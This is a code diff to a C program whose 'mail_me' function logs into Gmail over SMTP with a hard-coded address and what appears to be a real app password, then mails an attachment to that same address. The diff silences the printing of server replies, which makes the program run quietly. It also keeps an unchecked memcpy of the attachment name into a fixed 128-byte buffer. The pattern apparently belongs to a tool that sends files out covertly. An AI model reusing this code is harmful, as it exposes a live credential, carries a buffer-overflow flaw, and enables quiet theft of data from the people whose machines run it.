@@ -67,7 +67,7 @@ static inline void read_ssl2(SSL *s)
 {
   char recvbuf[BUF] = {'\0'};
   SSL_read(s, recvbuf, BUF - 1);
-  puts(recvbuf);
+  /* puts(recvbuf); */
 }
 
 static inline int read_ssl(SSL *s, char *buf)
@@ -111,27 +111,27 @@ int mail_me(const char *attachment)
   READ;
 
   WRITE("AUTH LOGIN\r\n");
-  read_ssl2(s);
+  READ;
 
-  write_base64(s, "t400.linux@gmail.com");
+  WRITE_ENC("t400.linux@gmail.com");
 
   WRITE("\r\n");
-  read_ssl2(s);
+  READ;
 
   WRITE_ENC("cvdb beak ovwl rece");
-  read_ssl2(s);
+  READ;
 
   WRITE(NEW_LINE);
-  read_ssl2(s);
+  READ;
 
   WRITE("MAIL FROM:<t400.linux@gmail.com>\r\n");
-  read_ssl2(s);
+  READ;
 
   WRITE("RCPT TO:<t400.linux@gmail.com>\r\n");
-  read_ssl2(s);
+  READ;
 
   WRITE("DATA\r\n");
-  read_ssl2(s);
+  READ;
 
   WRITE("MIME-Version: 1.0\r\n");
 
@@ -139,7 +139,6 @@ int mail_me(const char *attachment)
         "mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
 
   char subject[128];
-  /* sprintf(subject, "Subject: %s", attachment); */
   memcpy(subject, "Subject:", 8u);
   memcpy(subject + 8, attachment, strlen(attachment));
 
